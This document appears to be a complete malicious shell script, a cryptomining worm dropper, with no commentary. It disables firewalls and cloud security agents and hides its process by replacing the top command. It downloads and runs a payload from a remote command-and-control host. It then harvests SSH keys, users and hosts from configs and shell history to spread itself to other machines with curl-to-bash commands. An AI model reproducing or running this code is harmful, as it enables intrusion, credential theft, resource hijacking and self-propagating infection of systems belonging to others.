export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
sys=$(date|md5sum|awk -v n="$(date +%s)" '{print substr($1,1,n%7+6)}')
sys2=$(date|md5sum|awk -v n="$(date +%s)" '{print substr($1,1,n%8+6)}')

if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        cc="http://bash.givemexyz.in"
else
        cc="http://209.141.40.190"
fi

if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        url="http://bash.givemexyz.in"
else
        url="http://209.141.40.190"
fi

if [ $(ping -c 1 pool.supportxmr.com 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        dns=""
else
        dns="-d"
fi

get() {
  wget -q -O - $1 > $2 || curl -fsSL $1 -o $2 || php -r "file_put_contents('$2', file_get_contents('$1'));" || python -c "import urllib; print urllib.urlopen('$1').read()" > $2 || lwp-download $1 $2 || wge -q -O - $1 > $2 || cur -fsSL $1 -o $2
  chmod +x $2
}

cd /tmp || cd /var/tmp || cd /dev/shm || cd /mnt || cd /root || cd /

DIR=`cd /tmp || cd /var/tmp || cd /dev/shm || cd /mnt || cd /root || cd /; pwd`

ufw disable
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
chattr -ia /etc/ld.so.preload
echo > /etc/ld.so.preload
chattr -ia /etc/hosts
sed -i '/f2pool.com\|nanopool.org\|minexmr.com\|supportxmr.com\|c3pool.com/d' /etc/hosts

if test -f /usr/bin/top_; then
    echo ok
else
    mv /usr/bin/top /usr/bin/top_
    echo '#!/bin/sh
/usr/bin/top_ -p $(ps aux|grep -v "dbused"|awk "{print \$2}"|grep -v PID|sort -R|head -n20|tr "\n" ","|sed s"/.$//")' > /usr/bin/top
    chmod +x /usr/bin/top
fi


ps aux | grep -v grep | grep -E "cnrig|attack|/var/tmp/ip|scan.log|dovecat|solr.sh|solrd|donate-level|network0[0-1]|srv00[1-9]|srv01[0-2]" | awk '{print $2}' | xargs -I % kill -9 %

test -x "$(command -v crontab)" || {
    if [ $(id -u) -eq 0 ]; then
        apt-get update -y
        apt-get -y install cron
        service cron start
        yum update -y
        yum -y install crontabs
        service crond start
    fi
}

if [ $(id -u) -eq 0 ]; then
    apt-get -y install curl
    yum -y install curl
    if ps aux | grep -i "[a]liyun"; then
        curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
        curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
        pkill aliyun-service
        rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service /usr/local/aegis*
        systemctl stop aliyun.service
        systemctl disable aliyun.service
        service bcm-agent stop
        yum remove bcm-agent -y
        apt-get remove bcm-agent -y
    elif ps aux | grep -i "[y]unjing"; then
        /usr/local/qcloud/stargate/admin/uninstall.sh
        /usr/local/qcloud/YunJing/uninst.sh
        /usr/local/qcloud/monitor/barad/admin/uninstall.sh
    fi
fi

#rm -rf /tmp/* /tmp/.*
netstat -anp | grep ':52018\|:52019' | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %

get $cc/xms.$(uname -m) $DIR/$sys; chmod +x $DIR/$sys; $DIR/$sys; rm -rf $DIR/$sys

mv /sbin/iptables /sbin/iptables_


KEYS=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*' | grep -vw pub)
KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -v "\.ssh"
)
userlist=$(echo $USERZ | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
keylist=$(echo "$KEYS $KEYS2 $KEYS3" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
for user in $userlist; do
    for host in $hostlist; do
        for key in $keylist; do
            chmod +r $key; chmod 400 $key
            ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host "(curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR/xms"
        done
    done
done

